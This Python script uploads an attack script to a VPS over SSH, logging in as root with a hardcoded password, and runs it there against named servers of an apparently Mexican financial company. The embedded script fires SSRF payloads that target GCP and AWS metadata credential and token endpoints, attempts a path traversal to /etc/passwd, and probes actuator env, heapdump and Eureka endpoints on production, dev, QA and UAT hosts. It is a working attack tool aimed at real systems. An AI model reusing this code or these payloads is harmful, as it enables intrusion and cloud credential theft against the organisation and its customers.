import paramiko, sys

vps = '64.177.88.10'
password = r'5F.jyTK$D6%.F{a='

DEEP_SCRIPT = r'''
import requests, json, urllib3, ssl, socket
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def req(url, headers=None, follow=False):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    try:
        r = requests.get(url, headers=h, timeout=10, verify=False, allow_redirects=follow)
        return r.status_code, len(r.text), dict(r.headers), r.text[:1000]
    except Exception as e:
        return 0, 0, {}, str(e)

print("="*60)
print("DEEP PROBE - FISA/FINDEP")
print("="*60)

# 1. Check what the 65-byte default response is
print("\n[1] Default response on 35.188.27.26:8080")
code, sz, hdrs, body = req("http://35.188.27.26:8080/")
print(f"  Status: {code}, Size: {sz}")
print(f"  Headers: {json.dumps({k:v for k,v in hdrs.items() if k.lower() in ('server','x-powered-by','content-type','location')})}")
print(f"  Body: {repr(body)}")

# 2. SSRF with GCP metadata header
print("\n[2] SSRF - GCP Metadata with correct header")
ssrf_urls = [
    ("http://35.188.27.26:8080/?unix:AAAA{}|http://metadata.google.internal/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
    ("http://35.188.27.26:8080/?unix:AAAA{}|http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}),
    ("http://35.188.27.26:8080/?unix:AAAA{}|http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
    ("http://35.188.27.26:8080/?unix:AAAA{}|http://127.0.0.1:8761/eureka/apps", {"Accept": "application/json"}),
    ("http://35.188.27.26:8080/?unix:AAAA{}|http://127.0.0.1:8080/actuator/env", {}),
    ("http://35.188.27.26:8080/?unix:AAAA{}|http://127.0.0.1:8443/actuator/env", {}),
    ("http://35.188.27.26:8080/?unix:AAAA{}|http://127.0.0.1:9090/actuator/env", {}),
]
for url, extra_h in ssrf_urls:
    code, sz, hdrs, body = req(url, extra_h)
    print(f"  [{code}] {url[:80]}... size={sz}")
    if sz != 65:
        print(f"    DIFFERENT SIZE! Body: {repr(body[:200])}")

# 3. Alternate SSRF techniques
print("\n[3] Alternate SSRF vectors on Apache 2.4.6")
alt_ssrf = [
    "http://35.188.27.26:8080/proxy/http://169.254.169.254/latest/meta-data/",
    "http://35.188.27.26:8080/proxy/http://metadata.google.internal/computeMetadata/v1/",
    "http://35.188.27.26:8080/cgi-bin/..%00/etc/passwd",
    "http://35.188.27.26:8080/server-status",
    "http://35.188.27.26:8080/server-info",
    "http://35.188.27.26:8080/balancer-manager",
]
for url in alt_ssrf:
    code, sz, hdrs, body = req(url)
    interesting = sz != 65 and sz != 1414 and code != 404
    flag = " *** DIFFERENT ***" if interesting else ""
    print(f"  [{code}] {url} ({sz}b){flag}")
    if interesting:
        print(f"    Body: {repr(body[:200])}")

# 4. Follow the 302 redirects on despachos:80
print("\n[4] Following 302 redirects on despachos:80")
paths_302 = ["/spei/", "/pocc/", "/certificates/", "/actuator/env", "/heapdump", "/login", "/"]
for path in paths_302:
    code, sz, hdrs, body = req(f"http://35.188.27.26:80{path}", {"Host": "despachos.independencia.com.mx"})
    loc = hdrs.get("Location", hdrs.get("location", "N/A"))
    print(f"  [{code}] {path} -> Location: {loc}")

# 5. Follow redirect to see login page
print("\n[5] Following redirect fully on despachos:80")
code, sz, hdrs, body = req("http://35.188.27.26:80/", {"Host": "despachos.independencia.com.mx"}, follow=True)
print(f"  Final status: {code}, Size: {sz}")
print(f"  Body snippet: {repr(body[:500])}")

# 6. Eureka direct probe
print("\n[6] Eureka Service Registry - 35.225.39.206")
eureka_urls = [
    "http://35.225.39.206:80/",
    "http://35.225.39.206:80/eureka/",
    "http://35.225.39.206:80/eureka/apps",
    "https://35.225.39.206:443/",
    "https://35.225.39.206:443/eureka/apps",
    "http://35.225.39.206:8761/",
    "http://35.225.39.206:8761/eureka/apps",
]
for url in eureka_urls:
    code, sz, hdrs, body = req(url, {"Host": "eureka.independencia.com.mx", "Accept": "application/json"})
    interesting = code == 200 and sz > 100
    flag = " *** HIT ***" if interesting else ""
    print(f"  [{code}] {url} ({sz}b){flag}")
    if interesting:
        print(f"    Body: {repr(body[:300])}")

# 7. Dev environment (desarrollo)
print("\n[7] DEV - 34.68.215.6")
dev_urls = [
    "http://34.68.215.6:80/actuator/env",
    "http://34.68.215.6:80/actuator/health",
    "http://34.68.215.6:80/swagger-ui/",
    "http://34.68.215.6:80/",
    "https://34.68.215.6:443/actuator/env",
    "https://34.68.215.6:443/",
    "http://34.68.215.6:8080/actuator/env",
    "http://34.68.215.6:8080/",
    "http://34.68.215.6:8443/actuator/env",
]
for url in dev_urls:
    code, sz, hdrs, body = req(url, {"Host": "desarrollo.independencia.com.mx"})
    interesting = code == 200 and sz > 100
    flag = " *** HIT ***" if interesting else ""
    print(f"  [{code}] {url} ({sz}b){flag}")
    if interesting:
        print(f"    Body: {repr(body[:300])}")

# 8. QA
print("\n[8] QA - 34.70.22.48")
qa_urls = [
    "http://34.70.22.48:80/actuator/env",
    "http://34.70.22.48:80/actuator/health",
    "http://34.70.22.48:80/",
    "https://34.70.22.48:443/actuator/env",
    "https://34.70.22.48:443/",
    "http://34.70.22.48:8080/actuator/env",
    "http://34.70.22.48:8080/",
]
for url in qa_urls:
    code, sz, hdrs, body = req(url, {"Host": "bqqa.independencia.com.mx"})
    interesting = code == 200 and sz > 100
    flag = " *** HIT ***" if interesting else ""
    print(f"  [{code}] {url} ({sz}b){flag}")
    if interesting:
        print(f"    Body: {repr(body[:300])}")

# 9. UAT Aheeva (port 8484)
print("\n[9] UAT Aheeva - 34.121.92.79:8484")
uat_urls = [
    "http://34.121.92.79:8484/",
    "http://34.121.92.79:8484/actuator/env",
    "http://34.121.92.79:8484/actuator/health",
    "http://34.121.92.79:8484/swagger-ui/",
    "http://34.121.92.79:8484/api/",
    "https://34.121.92.79:8484/",
]
for url in uat_urls:
    code, sz, hdrs, body = req(url, {"Host": "aheevauat.independencia.com.mx"})
    interesting = code == 200 and sz > 50
    flag = " *** HIT ***" if interesting else ""
    print(f"  [{code}] {url} ({sz}b){flag}")
    if interesting:
        print(f"    Body: {repr(body[:300])}")

# 10. DEV Aheeva (port 8484)
print("\n[10] DEV Aheeva - 34.121.26.148:8484")
dev_ah_urls = [
    "http://34.121.26.148:8484/",
    "http://34.121.26.148:8484/actuator/env",
    "http://34.121.26.148:8484/actuator/health",
    "http://34.121.26.148:8484/swagger-ui/",
]
for url in dev_ah_urls:
    code, sz, hdrs, body = req(url, {"Host": "desaaheeva.independencia.com.mx"})
    interesting = code == 200 and sz > 50
    flag = " *** HIT ***" if interesting else ""
    print(f"  [{code}] {url} ({sz}b){flag}")
    if interesting:
        print(f"    Body: {repr(body[:300])}")

# 11. SIF financial
print("\n[11] SIF - 34.72.38.129")
sif_urls = [
    "http://34.72.38.129:80/actuator/env",
    "http://34.72.38.129:80/actuator/health",
    "http://34.72.38.129:80/swagger-ui/",
    "http://34.72.38.129:80/",
    "https://34.72.38.129:443/",
    "https://34.72.38.129:443/actuator/env",
    "http://34.72.38.129:8080/",
    "http://34.72.38.129:8080/actuator/env",
]
for url in sif_urls:
    code, sz, hdrs, body = req(url, {"Host": "sif.independencia.com.mx"})
    interesting = code == 200 and sz > 100
    flag = " *** HIT ***" if interesting else ""
    print(f"  [{code}] {url} ({sz}b){flag}")
    if interesting:
        print(f"    Body: {repr(body[:300])}")

# 12. SSL cert dump from all targets
print("\n[12] SSL Certificate Subject/Issuer dump")
for ip, port, name in [
    ("35.188.27.26", 443, "bigdatainfo"),
    ("35.225.39.206", 443, "eureka"),
    ("34.68.215.6", 443, "desarrollo"),
    ("34.72.38.129", 443, "sif"),
    ("34.110.220.98", 443, "sif2"),
    ("34.70.22.48", 443, "bqqa"),
    ("34.121.92.79", 443, "aheevauat"),
    ("34.121.26.148", 443, "desaaheeva"),
    ("34.102.167.192", 443, "aheevaqa"),
    ("35.222.97.7", 443, "aheevasuper"),
]:
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(), server_hostname=f"{name}.independencia.com.mx") as s:
            s.settimeout(5)
            s.connect((ip, port))
            cert = s.getpeercert()
            subj = dict(x[0] for x in cert.get('subject', []))
            issuer = dict(x[0] for x in cert.get('issuer', []))
            san = cert.get('subjectAltName', [])
            san_list = [v for _, v in san[:5]]
            print(f"  {name} ({ip}): CN={subj.get('commonName','?')} Issuer={issuer.get('organizationName','?')} SAN={san_list}")
    except Exception as e:
        print(f"  {name} ({ip}): SSL error - {e}")

print("\n" + "="*60)
print("DEEP PROBE COMPLETE")
print("="*60)
'''

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    ssh.connect(vps, username='root', password=password, timeout=10)
    print(f'Connected to {vps}')
    
    sftp = ssh.open_sftp()
    with sftp.open('/root/deep_probe.py', 'w') as f:
        f.write(DEEP_SCRIPT)
    sftp.close()
    print('Uploaded deep_probe.py')
    
    stdin, stdout, stderr = ssh.exec_command('python3 /root/deep_probe.py 2>&1', timeout=600)
    for line in stdout:
        print(line.strip())
    for line in stderr:
        print(f'ERR: {line.strip()}')
    ssh.close()
    print('\nDone.')
except Exception as e:
    print(f'Error: {e}')
    sys.exit(1)
